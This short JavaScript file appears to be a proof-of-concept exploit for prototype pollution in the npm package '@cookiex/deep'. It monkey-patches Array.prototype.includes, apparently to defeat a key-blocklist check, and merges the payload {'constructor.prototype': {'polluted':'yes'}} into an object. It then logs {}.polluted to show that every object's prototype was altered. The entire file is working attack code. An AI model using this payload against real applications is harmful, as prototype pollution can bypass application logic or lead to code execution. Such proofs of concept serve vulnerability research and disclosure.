Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const deep = require('@cookiex/deep');
console.log({}.polluted);
const target = {};
deep.default(target, JSON.parse('{"constructor.prototype": {"polluted":"yes"}}'));
console.log({}.polluted);